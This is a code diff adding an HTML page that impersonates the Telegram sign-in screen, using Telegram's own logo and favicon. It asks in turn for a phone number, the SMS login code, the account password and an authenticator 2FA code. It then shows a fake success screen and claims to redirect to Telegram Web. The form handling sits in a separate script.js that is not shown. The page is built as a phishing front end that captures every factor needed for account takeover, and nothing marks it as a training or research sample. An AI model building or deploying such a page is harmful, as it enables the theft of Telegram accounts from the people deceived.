@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Telegram Desktop</title>
+    <link rel="icon" href="https://telegram.org/favicon.ico" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --bg: #0d1117;
+        --card: #161b22;
+        --border: #30363d;
+        --text: #c9d1d9;
+        --text-muted: #8b949e;
+        --primary: #238cf5;
+        --primary-hover: #1a6cd4;
+      }
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        background: var(--bg);
+        color: var(--text);
+        font-family: "Inter", sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 16px;
+      }
+      .container {
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 16px;
+        width: 100%;
+        max-width: 400px;
+        padding: 40px 32px;
+        box-shadow: 0 12px 32px rgba(0, 0, 0, 0.5);
+        position: relative;
+        overflow: hidden;
+      }
+      .logo {
+        width: 72px;
+        height: 72px;
+        margin: 0 auto 24px;
+        display: block;
+      }
+      h1 {
+        font-size: 22px;
+        font-weight: 600;
+        text-align: center;
+        margin-bottom: 8px;
+      }
+      p {
+        font-size: 14px;
+        color: var(--text-muted);
+        text-align: center;
+        margin-bottom: 24px;
+        line-height: 1.5;
+      }
+      input {
+        width: 100%;
+        padding: 14px 16px;
+        margin: 8px 0;
+        background: #0d1117;
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        color: var(--text);
+        font-size: 16px;
+        outline: none;
+        transition: all 0.2s;
+      }
+      input:focus {
+        border-color: var(--primary);
+        box-shadow: 0 0 0 3px rgba(35, 140, 245, 0.2);
+      }
+      button {
+        width: 100%;
+        padding: 14px;
+        background: var(--primary);
+        color: white;
+        border: none;
+        border-radius: 12px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        margin-top: 16px;
+        transition: background 0.2s;
+      }
+      button:hover {
+        background: var(--primary-hover);
+      }
+      button:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+      }
+      .step {
+        display: none;
+      }
+      .step.active {
+        display: block;
+        animation: fadeIn 0.4s ease;
+      }
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(8px);
+        }
+        to {
+          opacity: 1;
+          transform: none;
+        }
+      }
+      .loading {
+        display: none;
+        margin: 20px auto;
+        width: 36px;
+        height: 36px;
+        border: 3px solid var(--border);
+        border-top: 3px solid var(--primary);
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      .success-check {
+        display: none;
+        width: 60px;
+        height: 60px;
+        margin: 20px auto;
+        border: 4px solid #238cf5;
+        border-radius: 50%;
+        position: relative;
+      }
+      .success-check::after {
+        content: "";
+        position: absolute;
+        top: 12px;
+        left: 18px;
+        width: 12px;
+        height: 24px;
+        border: solid white;
+        border-width: 0 4px 4px 0;
+        transform: rotate(45deg);
+      }
+      .footer {
+        margin-top: 32px;
+        font-size: 12px;
+        color: #58a6ff;
+        text-align: center;
+      }
+      .footer a {
+        color: #58a6ff;
+        text-decoration: none;
+      }
+      .footer a:hover {
+        text-decoration: underline;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <img
+        src="https://telegram.org/img/t_logo.png"
+        class="logo"
+        alt="Telegram Logo"
+      />
+
+      <!-- STEP 1: Phone -->
+      <div id="stepPhone" class="step active">
+        <h1>Sign in to Telegram</h1>
+        <p>Please confirm your country and enter your phone number.</p>
+        <input type="tel" placeholder="+1 234 567 8900" id="phone" autofocus />
+        <button onclick="sendCode()">Next</button>
+        <div class="loading" id="loadPhone"></div>
+      </div>
+
+      <!-- STEP 2: OTP -->
+      <div id="stepOTP" class="step">
+        <h1>Enter code</h1>
+        <p>We have sent a login code to <strong id="sentTo"></strong></p>
+        <input type="text" placeholder="Login code" id="otp" maxlength="6" />
+        <button onclick="submitOTP()">Continue</button>
+        <div class="loading" id="loadOTP"></div>
+      </div>
+
+      <!-- STEP 3: Password -->
+      <div id="stepPass" class="step">
+        <h1>Enter password</h1>
+        <p>Your account has a password.</p>
+        <input type="password" placeholder="Password" id="pass" />
+        <button onclick="submitPass()">Sign in</button>
+        <div class="loading" id="loadPass"></div>
+      </div>
+
+      <!-- STEP 4: 2FA -->
+      <div id="step2FA" class="step">
+        <h1>Two-step verification</h1>
+        <p>Enter the code from your authenticator app.</p>
+        <input type="text" placeholder="000000" id="twofa" maxlength="6" />
+        <button onclick="submit2FA()">Verify</button>
+        <div class="loading" id="load2FA"></div>
+      </div>
+
+      <!-- STEP 5: Success -->
+      <div id="stepSuccess" class="step">
+        <h1>Logged in successfully</h1>
+        <div class="success-check"></div>
+        <p style="margin-top: 16px">Redirecting to Telegram Web...</p>
+      </div>
+
+      <div class="footer">
+        <a href="https://telegram.org" target="_blank">telegram.org</a>
+      </div>
+    </div>
+
+    <script src="./script.js"></script>
+  </body>
+</html>
